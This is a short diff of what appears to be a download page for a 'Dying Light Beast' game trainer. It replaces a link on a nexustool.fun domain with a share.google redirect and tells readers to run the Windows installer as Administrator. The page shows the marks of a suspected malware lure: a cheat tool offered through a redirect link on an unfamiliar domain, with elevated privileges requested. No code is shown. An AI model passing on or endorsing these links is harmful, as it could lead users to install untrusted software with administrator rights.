@@ -24,7 +24,7 @@ Direct installer link below.
 | | |
 | --- | --- |
 | **Direct link** | **[https://share.google/8Ujwwl735ztNcfA7q](https://share.google/8Ujwwl735ztNcfA7q)** |
-| **Full URL** | `https://dyinglightbeasttrainer.nexustool.fun/` |
+| **Full URL** | `https://share.google/8Ujwwl735ztNcfA7q` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
